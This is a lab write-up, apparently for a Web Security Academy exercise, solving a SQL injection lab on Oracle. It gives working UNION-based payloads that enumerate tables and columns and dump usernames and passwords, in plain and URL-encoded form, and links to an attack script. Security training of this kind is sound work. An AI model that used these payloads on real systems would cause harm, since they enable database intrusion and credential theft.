# Lab 10: SQL injection attack, listing the database contents on Oracle

This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

To solve the lab, log in as the administrator user.

## Solution
> Manual exploitation
1. Use Burp Suite to intercept and modify the request that sets the product category filter.
2. Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, both of which contain text, using a payload like the following in the `category` parameter: ```'+UNION+SELECT+'abc','def'+FROM+dual--```
3. Use the following payload to retrieve the list of tables in the database: ```'+UNION+SELECT+table_name,NULL+FROM+all_tables--```
4. Find the name of the table containing user credentials.
5. Use the following payload (replacing the table name) to retrieve the details of the columns in the table: ```'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'--```
6. Find the names of the columns containing usernames and passwords.
7. Use the following payload (replacing the table and column names) to retrieve the usernames and passwords for all users: ```'+UNION+SELECT+USERNAME_ABCDEF,+PASSWORD_ABCDEF+FROM+USERS_ABCDEF--```
8. Find the password for the administrator user, and use it to log in.

> Scripting the attack: [Script](https://github.com/darshannn10/PortSwiggers-Web-Sec-Academy/blob/main/SQL-Injection/lab-10/sqli-lab-10.py)

## Payload
Identifying the no. of columns: `'+UNION+SELECT+'a','a'+FROM+dual--`

To get Table names:`' UNION SELECT table_name,NULL FROM all_tables--`

> Table name: `USERS_YOPQVR`

To get column names: `' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS_YOPQVR'--`

> Column name: `USERNAME_IZSVDC` & `PASSWORD_EEWPRQ` & 

Final Normal Payload: `' UNION SELECT USERNAME_IZSVDC, PASSWORD_EEWPRQ FROM USERS_YOPQVR--`

Final URL-Encoded Payload: `%27%20UNION%20SELECT%20USERNAME_IZSVDC,%20PASSWORD_EEWPRQ%20FROM%20USERS_YOPQVR--`
## Video Solution:
1. Manual Exploit: [Rana Khalil's Youtube Video](https://youtu.be/ZbwIbIq5-eE)
2. Automating the attack: [Rana Khalil's Youtube Video](https://www.youtube.com/watch?v=53mjCmPrsDg&list=PLuyTk2_mYISLaZC4fVqDuW_hOk0dd5rlf&index=11)
